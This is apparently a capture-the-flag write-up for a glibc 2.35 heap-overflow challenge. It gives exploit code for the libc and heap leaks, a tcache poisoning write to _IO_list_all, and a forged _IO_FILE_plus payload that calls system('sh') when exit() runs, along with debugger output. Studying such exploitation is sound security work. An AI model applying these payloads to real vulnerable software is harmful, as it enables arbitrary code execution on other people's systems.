# RCE from heap exploitation is fucking anoying

In heap exploitation CTFs with Full RELRO, I usually get RCE by overwriting a glibc GOT entry with a one\_gadget and hoping it works. It’s not pretty, but it often gets the job done.  
In [LA\_CTF 2026](https://platform.lac.tf/challs), that method didn’t work at all. Every one\_gadget was useless, so the only option left was writing to the stack, which was ugly, annoying, and fucking painful to pull off (don't believe me? check [x.py](./x.py)).  
After the CTF ended, I saw [z0v3r1n’s](https://github.com/z0v3r1n) solution, and it was really clean. He abused `_IO_list_all` to replace the program’s file structures with a fake `_IO_FILE` struct. When exit() is called, glibc flushes all files, hits the fake structure, and gives RCE (how fucking cool is that?).    


# tcacademy

## Overeview
```
[*] '/home/x/ctf/lactf_/pwn/tcademy/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

The challenge itself is a straightforward heap overflow, but with a few constraints: you can only have two allocations at the same time, and each allocation is limited to 0xf8 bytes.  

[chall.c:25]
```c
    if (index < 0 || index >= 2){
        puts("Invalid index!!!");
        exit(1);
    }
```

[chall.c:54]
```c
    if (size < 0 || size > 0xf8) {
        puts("Invalid size!!!");
        exit(1);
    }
```

## Libc leak
As mentioned earlier, the challenge contains a heap overflow caused by an integer overflow [resized\_size].
[chall.c:33]
```c
    // I prevented all off-by-one's by forcing the size to be at least 7 less than what was declared by the user! I am so smart
    unsigned short resized_size = size == 8 ? (unsigned short)(size - 7) : (unsigned short)(size - 8);
    int bytes = read(0, note, resized_size);
```

Using the overflow, we can allocate multiple chunks with sequential sizes, then overflow into the size field to free them in a way that results in a single large chunk ending up in the unsorted bin.  

[x.py:61]
```py
    alloc(0, 4, b"hell\n")          # leader chunk
    alloc(1, 4 ,b"hell\n")
    free(1);
    log.info("allocating a bunch of useless fucking chunks")
    for i in range(4, 30):
        log.info(f"allocating chunk size {i * 8}")
        alloc(1, (8 * i), b"\n")
        free(1)
    
    alloc(1, (8 * 4), b"\n")
    free(0)
    alloc(0, 4, b"\x00" * (8 * 3) + p64(0x21) + b"\x00" * (8 * 3) + p64(0x750 | 1))          # leader chunk
    free(0)
```

Here is where my solution and [z0v3r1n’s](https://github.com/z0v3r1n) differ. Instead of keeping the leader chunk, they allocated two of each chunk and freed them. That way, when messing with tcache fds, things were much easier.  

[solve.py:32]
```py

make(0, 0)
make(1, 0x18)

free(1)
free(0)

for i in range(0x20, 0xa0, 0x10): make(0, i) ; make(1, i) ; free(0) ; free(1)
```

Now we have a free 0x750 chunk in the unsorted bin that points to libc. All we need to do is overflow the chunk before it and print it to leak the libc address.  

## Heap Leak
A heap leak is also needed here because we’re using `glibc 2.35`, which has `SAFE_LINKING`. Getting it was easy though, we already have a lot of freed chunks that point to nothing, so one more overflow and a print in the leader chunk will get the job done.

[x.py:60]
```py
    log.info(f"leaking heap base")
    free(0)
    alloc(0, 4, b"A" * (8 * 14))          # leader chunk
    heap_base = unpack_ptr(puts(0)[8 * 14::]) << 12
```

## FSOPing our way into an RCE
We now have everything we need. Next, we’ll make a pointer to `_IO_list_all`, which holds all the opened IO files.

[solve.py:61]
```
make(0, 0, b'A'*0x18 + p64(0x560|1) + b'A'*0x18 + p64(0x30|1) + b'A'*0x28 + p64(0x30|1) + p64(libc.sym._IO_list_all^(heap_base>>12)))
```

Then create a fake `_IO_FILE_PLUS` struct which will have our payload.

[solve.py:68]
```py
fs = flat(
    {
        0x00: b"aa;sh\x00",
        0x08: p64(0),
        0x20: p64(0),
        0x28: p64(1),
        0x68: libc.symbols["system"],
        0x88: libc.symbols["_IO_stdfile_0_lock"],
        0xA0: heap_base+0x2a0 - 0x10,
        0xC0: p64(0),
        0xD0: heap_base+0x2a0,
        0xD8: libc.symbols["_IO_wfile_jumps"],
    },
    filler=b'\x00'
)
```

Which translates to :
```
$2 = {
  file = {
    _flags = 1933271393,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x1 <error: Cannot access memory at address 0x1>,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7fcc32650d70 <__libc_system>,
    _fileno = 0,
    _flags2 = 0,
    _old_offset = 0,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x7fcc3281ca80 <_IO_stdfile_0_lock>,
    _offset = 0,
    _codecvt = 0x0,
    _wide_data = 0x556bce35b290,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 12 times>, "\240\2625\316kU\000"
  },
  vtable = 0x7fcc328170c0 <__GI__IO_wfile_jumps>
}
```

The key part here is `_wide_data`. It sits in the same place as our `_IO_FILE_plus`, but its `_wide_vtable->__doallocate` points to system, which is exactly what we want.

```
pwndbg> p *_IO_list_all.file->_wide_data
$3 = {
  _IO_read_ptr = 0x0,
  _IO_read_end = 0x21 <error: Cannot access memory at address 0x21>,
  _IO_read_base = 0x68733b6161 <error: Cannot access memory at address 0x68733b6161>,
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x1 <error: Cannot access memory at address 0x1>,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _IO_state = {
    __count = 0,
    __value = {
      __wch = 0,
      __wchb = "\000\000\000"
    }
  },
  _IO_last_state = {
    __count = 0,
    __value = {
      __wch = 0,
      __wchb = "\000\000\000"
    }
  },
  _codecvt = {
    __cd_in = {
      step = 0x0,
      step_data = {
        __outbuf = 0x0,
        __outbufend = 0x7fcc32650d70 <__libc_system> "\363\017\036\372H\205\377t\a\351\202\373\377\377f\220H\203\354\bH\215=\365x\030",
        __flags = 0,
        __invocation_counter = 0,
        __internal_use = 0,
        __statep = 0x0,
        __state = {
          __count = 847366784,
          __value = {
            __wch = 32716,
            __wchb = "\314\177\000"
          }
        }
      }
    },
    __cd_out = {
      step = 0x0,
      step_data = {
        __outbuf = 0x0,
        __outbufend = 0x556bce35b290 "",
        __flags = 0,
        __invocation_counter = 0,
        __internal_use = 0,
        __statep = 0x0,
        __state = {
          __count = 0,
          __value = {
            __wch = 0,
            __wchb = "\000\000\000"
          }
        }
      }
    }
  },
  _shortbuf = L"",
  _wide_vtable = 0x556bce35b2a0
}
```

```
pwndbg> p *_IO_list_all.file->_wide_data->_wide_vtable
$4 = {
  __dummy = 448609870177,
  __dummy2 = 0,
  __finish = 0x0,
  __overflow = 0x0,
  __underflow = 0x0,
  __uflow = 0x1,
  __pbackfail = 0x0,
  __xsputn = 0x0,
  __xsgetn = 0x0,
  __seekoff = 0x0,
  __seekpos = 0x0,
  __setbuf = 0x0,
  __sync = 0x0,
  __doallocate = 0x7fcc32650d70 <__libc_system>,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x7fcc3281ca80 <_IO_stdfile_0_lock>,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x556bce35b290
}
```

Let's set a breakpoint in `main+245` just before exit to see what happens
```
pwndbg> break *main+245
```

When `exit()` is called, it triggers `__run_exit_handlers()`, which runs several cleanup functions from `__exit_funcs`. This [path](https://blog.kittycar.online/posts/2025/04/07/exit-functions-in-libc/) could also be abused to call system(), but it would need a leak from ld.so to demangle pointers. I haven’t tried it yet, but it’s something I might look into later.
```
   140 void
   141 exit (int status)
 ► 142 {
   143   __run_exit_handlers (status, &__exit_funcs, true, true);
   144 }
```

This line invokes [\_IO\_cleanup](https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/genops.c#L862), the routine responsible for flushing and finalizing all open FILE streams.

```c
In file: /usr/share/src/glibc/stdlib/exit.c:133
   128         free (cur);
   129     }
   130 
   131   __libc_lock_unlock (__exit_funcs_lock);
   132 
 ► 133   if (run_list_atexit)
   134     RUN_HOOK (__libc_atexit, ());
   135 
   136   _exit (status);
   137 }
```

And voila [\_IO\_wfile\_overflow](https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/wfileops.c#L408) ends up invoking \_IO\_wdoallocbuf, passing our crafted FILE structure as its argument.

```
In file: /usr/share/src/glibc/libio/wfileops.c:420
   415   if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
   416     {
   417       /* Allocate a buffer if needed. */
   418       if (f->_wide_data->_IO_write_base == 0)
   419         {
 ► 420           _IO_wdoallocbuf (f);
   421           _IO_free_wbackup_area (f);
   422           _IO_wsetg (f, f->_wide_data->_IO_buf_base,
   423                      f->_wide_data->_IO_buf_base, f->_wide_data->_IO_buf_base);
   424 
   425           if (f->_IO_write_base == NULL)
```


# Wrapping up  
This challenge showed how unreliable `one_gadgets` can be . FSOP Rocks!
